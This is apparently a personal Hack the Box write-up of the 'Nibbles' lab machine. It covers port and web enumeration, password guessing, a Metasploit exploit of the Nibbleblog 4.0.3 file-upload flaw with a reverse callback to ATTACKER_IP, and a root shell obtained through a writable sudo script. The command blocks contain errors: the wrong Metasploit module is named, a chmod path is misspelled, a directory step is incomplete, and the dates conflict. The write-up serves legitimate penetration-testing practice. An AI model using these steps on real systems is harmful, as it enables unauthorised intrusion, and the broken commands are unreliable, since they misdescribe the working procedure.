**Difficulty:** Easy
**OS:** Linux
**Date Completed:** 2026-08-27
**Write-up Authored by:** Ian Simons
**Challenge Created by:** ch4p
**Core Competencies:**
- Network Enumeration with Nmap
- Vulnerability Research
- Initial Access with Metasploit
- Vulnerability Scanning with Metasploit
- Privilege Escalation with Metasploit

---
## Overview
This Box was recommended by the Hack the Box Academy Job Role Path "Penetration Tester" in the "Getting Started" Module. The purpose of completing this box is to build familiarity with Metasploit. As we will see it did just that.
Note: Flags documented in Appendix B

---
## Vulnerability summary

| Vulnerability                            | CVE           | CVSS Score    | MITRE ATT&CK Technique | ATT&CK Tactic |
| ---------------------------------------- | ------------- | ------------- | ---------------------- | ------------- |
| Nibbleblog 4.0.3 - Arbitrary File Upload | CVE-2015-6967 | 6.5 (CVSS v2) |                        |               |

---
## Attack Path Summary
1. Performed network reconnaissance with **Nmap** and identified **OpenSSH 7.2p2** running on Ubuntu as well as **Apache HTTP Server 2.4.18** 
2. Performed web enumeration, and identified **Nibbleblog v4.0.3** 
3. Identified the username **admin** in a configuration file
4. Successfully guessed the password of nibbles
5. Leveraged the **Metasploit Framework** module **exploit/multi/http/nibbleblog_file_upload** to gain initial access to the machine
6. Identified that the current user had **NOPASSWD** sudo privileges for **/home/nibbler/personal/stuff/monitor.sh**
7. Identified that current user has write access to **/home/nibbler/personal/stuff/monitor.sh**
8. Edited the script **monitor.sh** to spawn a root shell and ran script, successfully achieving root privileges
---
## Reconnaissance
### Port Discovery
Nmap scan results
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~]
└──╼ [★]$ sudo nmap -sC -sV -oN scan.txt 10.129.64.28
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 14:01 EDT
Nmap scan report for 10.129.64.28
Host is up (0.0085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds

```

#### Key Open Ports and Services

| Port   | Service | Version             |
| ------ | ------- | ------------------- |
| 22/TCP | SSH     | OpenSSH 7.2p2       |
| 80/TCP | HTTP    | Apache httpd 2.4.18 |

### Web Enumeration 
Web application returned a page displaying only "Hello world!", but a comment in the html said, `<!-- /nibbleblog/ directory. Nothing interesting here! -->`. Upon navigating to **/nibbleblog** an empty blog was found, in the bottom right stating it was "Powered by Nibbleblog" ran a **Gobuster** scan against the blog and found the following results.
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.64.28/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.64.28/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 325] [--> http://10.129.64.28/nibbleblog/content/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.64.28/nibbleblog/themes/]
/admin                (Status: 301) [Size: 323] [--> http://10.129.64.28/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.64.28/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 327] [--> http://10.129.64.28/nibbleblog/languages/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

Identified nibble blog version of 4.0.3 on **/nibbleblog/README** which was publicly accessible.
Identified username **admin** in the file **/nibbleblog/content/private/users.xml** which was publicly accessible.
### Vulnerability Research
Identified CVE-2015-6967 associated with **nibbleblog** 4.0.3 It is an arbitrary file upload vulnerability allowing remote code execution through the my image plugin.and a **Metasploit** module already exist for it

---
## Initial Access
### Vulnerability Details
- Description: Nibbleblog 4.0.3 - Arbitrary File Upload
- CVE: CVE-2015-6967
- CVSS score: 6.5 (CVSS v2)
- MITRE ATT&CK: 

Nibble Blog 4.0.3 is vulnerable to an unrestricted file upload. This means that administrators can upload files with an executable extension which would then allow them to execute arbitrary code using a direct request to **/content/private/plugins/my_image/image.php**. There is an existing **Metasploit** Module for this vulnerability and as I am working to improve my **Metasploit skills** we will utilize this module.
#### Exploitation Steps
Based on the identified Nibble Blog 4.0.3 vulnerability we identified, the **Metasploit** module **exploit/multi/http/nibbleblog_file_upload** was selected because it specifically targets CVE-2015-6967. While we only currently have the username admin. We are unable to brute force this due to the lockout threshold of 1 so we will have to give it our best guess, I will try nibbles as the whole page seems to be focused on the nibbles

1. Launch Metasploit framework
2. Select module **exploit/multi/http/nibbleblog_file_upload** targeting CVE-2015-6967 
3. Configure target and callback parameters
4. Execute the exploit and obtain a remote session
#### Key Commands / Payloads
```
#launch Metasploit Framework console
msfconsole

#select appropriate exploit module
use exploit/windows/iis/iis_webdav_scstoragepathfromurl

#set appropriate options for module
set PASSWORD nibbles
set RHOST <TARGET_IP>
set RPORT 80
set TARGETURI /nibbleblog/
set USERNAME admin
set LHOST <ATTACKER_IP>
set LPORT 4444

#run exploit
run
```

#### Proof of Access 
##### Screenshots
![InitialAccess.jpg](../../../Images/Nibbles/InitialAccess.jpg)
Figure 1: Proof of initial access. Successful exploitation of CVE-2015-6967 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system.
##### Session Validation Commands
```
#Check user context
whoami

#Verify target hostname
hostname

#Verify operating system version
 uname -a
```

---
## Privilege Escalation 
### Vulnerability Details
- Description: 
- CVE: 
- CVSS score: 
- MITRE ATT&CK: 

Checked current users sudo permissions and found that through the use of a .sh file on the server I would be able to successfully escalate my privileges. create file **/home/nibbler/personal/stuff/monitor.sh**
#### Exploitation Steps
1. Check current sudo privileges
2. Create needed directories
3. Create necessary script
4. Change script permissions
5. Execute script with sudo and obtain root privileges
#### Key Commands / Payloads
```
#check current sudo privileges
sudo -l

#create necessary directories
mkdir -p /home/nibbler/personal

#create script with commands we want
echo "bash -c '/bin/bash'" > /home/nibbler/personal/stuff/monitor.sh

#change script permissions
chmod +x /home/nibbler/personal/stuff/monitor.shp

#run script as root
sudo /home/nibbler/personal/stuff/monitor.sh

#confirm user context
whoami

```

#### Proof of Privileges Escalation

![privEsc.jpg](../../../Images/Nibbles/privEsc.jpg) 
Figure 2: Proof of Privilege Escalation. Successful exploitation resulted in execution within the root security context. Privileges validated by confirming execution context with the whoami command.

---
## Lessons Learned 
The whole point of completing this Box was to build the fundamentals of using Metasploit. In that endeavor this Box was a complete success. There were absolutely some pain points along the way. However I now feel much more comfortable getting around the Metasploit Framework Console and utilizing a Meterpreter shell. Below are some key takeaways that hopefully can help others also attempting to solidify these fundamentals.
- Identifying a vulnerability before searching for an exploit is often more ifficient than searching for exploits first. Correlating discovered services with known CVEs can significantly narrow the research scope
- Initial access does not guarantee successful privilege escalation. Session preparation and stability can be the difference between success and failure
- Active exploitation can destabilize or crash services. Maintain thorough notes and documentation to ensure quick recovery if that happens
---
## Appendix
### Appendix A
#### Tools Used 
| Tool                 | Purpose                                                                       |
| -------------------- | ----------------------------------------------------------------------------- |
| Nmap                 | Network Reconnaissance, Service Discovery, and version detection              |
| SearchSploit         | Vulnerability research and exploit identification                             |
| Metasploit Framework | Exploitation, session management, post-exploitation, and privilege escalation |

### Appendix B
#### Flags found
![[ActionsOnObjective.jpg]]
User Flag:
700c\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*7d1

Root Flag:
aa4\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*6e9

### Appendix C
#### Supporting Evidence
No additional supporting evidence was required beyond the artifacts included throughout this write-up